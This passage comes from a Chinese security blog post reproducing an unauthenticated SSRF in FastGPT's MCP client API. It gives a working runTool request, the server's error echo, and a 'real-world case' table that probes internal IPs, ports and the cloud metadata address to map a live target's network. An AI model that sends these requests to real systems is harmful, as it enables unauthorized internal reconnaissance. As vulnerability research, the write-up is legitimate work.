+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/support/mcp/client/runTool</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://127.0.0.1:47654&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;toolName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;poc&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;headerSecret&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>响应（与 getTools 完全一致的回显 oracle）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">500</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SSE error: TypeError: fetch failed: connect ECONNREFUSED 127.0.0.1:47654&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>runTool 相对 getTools 的增量：<code>toolName</code> 与 <code>params</code> 完全可控 —— 当 <code>url</code> 指向内网真实 MCP 服务时可发起协议级工具调用；指向攻击者服务器时可在 body 中携带任意 arguments（同系列目标已用 webhook.site 实证：两接口均产生 GET+POST 成对回连，UA&#x3D;node，来源 IP 为目标服务器本身）。</p>
+<p><strong>判定逻辑</strong>：可达目标返回”内容类型&#x2F;证书校验”错误、关闭端口返回”ECONNREFUSED + IP:端口”，两类响应可区分且均由服务器侧产生 → 两接口 SSRF 均成立</p>
+<h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p><img src="/../img/fastgpt-mcpClient/image-20260904005010864.png" srcset="/img/loading.gif" lazyload alt="image-20260904005010864"></p>
+<p><img src="/../img/fastgpt-mcpClient/image-20260904005031898.png" srcset="/img/loading.gif" lazyload alt="image-20260904005031898"></p>
+<p>实际测试下来发现</p>
+<p>用 mcp&#x2F;client getTools 对目标内网地址段做系统化探测，每种网络状态都有<strong>可区分的回显</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>探测地址</th>
+<th>回显</th>
+<th>状态判定</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>http://127.0.0.1:3000</code></td>
+<td><code>connect ECONNREFUSED 127.0.0.1:3000</code></td>
+<td>闭合（<strong>精确回显 IP:端口</strong>）</td>
+</tr>
+<tr>
+<td><code>http://127.0.0.1:3001/3002/27017/6379/80/443/47654</code></td>
+<td>全部 <code>ECONNREFUSED 127.0.0.1:&lt;端口&gt;</code></td>
+<td>逐端口闭合确认</td>
+</tr>
+<tr>
+<td><code>http://172.18.0.1:3000</code></td>
+<td><code>Invalid content type</code></td>
+<td><strong>开放</strong>（HTTP 服务，非 MCP）</td>
+</tr>
+<tr>
+<td><code>http://172.18.0.1:3000/definitely-not-exist-xyz</code></td>
+<td><code>Non-200 status code (404)</code></td>
+<td><strong>开放且服务指纹可读</strong>（404 应答）</td>
+</tr>
+<tr>
+<td><code>http://172.18.0.1:3001</code></td>
+<td><code>connect ECONNREFUSED 172.18.0.1:3001</code></td>
+<td>同主机闭合端口</td>
+</tr>
+<tr>
+<td><code>http://172.18.0.1:27017</code></td>
+<td><code>connect ECONNREFUSED 172.18.0.1:27017</code></td>
+<td>同主机闭合端口</td>
+</tr>
+<tr>
+<td><code>http://172.17.0.1:80/3000/3001/3005/3306</code></td>
+<td>无回显（超时）</td>
+<td><strong>被过滤</strong>（与闭合状态明确区分）</td>
+</tr>
+<tr>
+<td><code>http://10.0.0.1:80</code></td>
+<td>无回显（超时）</td>
+<td>被过滤&#x2F;不可达</td>
+</tr>
+<tr>
+<td><code>http://169.254.169.254/latest/meta-data/</code></td>
+<td>无回显（超时）</td>
+<td>云元数据被防火墙过滤</td>
+</tr>
+</tbody></table>
+<p><strong>结论</strong>：三种网络状态（开放&#x2F;闭合&#x2F;被过滤）通过不同回显完全可区分，且在同一内网主机（172.18.0.1）上实现了逐端口判别 —— 该 SSRF 是一个<strong>完整的内网端口扫描与服务指纹识别 oracle</strong>，实测即发现了内网开放服务 172.18.0.1:3000</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/web%E5%AE%89%E5%85%A8/cve/" class="category-chain-item">cve</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="print-no-link">#漏洞挖掘</a>
+      
+        <a href="/tags/cve/" class="print-no-link">#cve</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fastgpt-mcpCLient未认证ssrf复现</div>
+      <div>https://exploreio.github.io/2026/09/04/fastgpt-mcpCLient未认证ssrf复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ExploreIO</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年9月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/29/CVE-2026-79483-EN/" title="CVE-2026-79483-EN">
+                        <span class="hidden-mobile">CVE-2026-79483-EN</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="margin-top: 8px; font-size: 14px; opacity: 0.7;"> <span id="vercount_value_site_pv">Loading</span> 次访问 · <span id="vercount_value_site_uv">Loading</span> 位访客 </div> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100,"easing":"ease-in-out"})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://events.vercount.one/js?i=/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<!-- 全屏背景 -->
+<script src="/js/background.js?v=1788455395861"></script>
+
+<!-- 落雪动画 -->
+<script src="/js/snow.js?v=1788455395861"></script>
+
+<!-- 签名动画 -->
+<script src="/js/sign.js?v=1788455395861"></script>
+<link rel="stylesheet" href="/css/sign.css?v=1788455395861">
+
+<!-- 标签页标题变化 -->
+<script src="/js/title.js?v=1788455395861"></script>
+
+<!-- 文章卡片滑入动画 -->
+<script src="/js/scrollAnimation.js?v=1788455395861"></script>
+<link rel="stylesheet" href="/css/scrollAnimation.css?v=1788455395861">
+
+<!-- 网站运行时间 -->
+<script src="/js/time-insert.js?v=1788455395861"></script>
+  <!-- hexo injector body_end end --></body>
+</html>
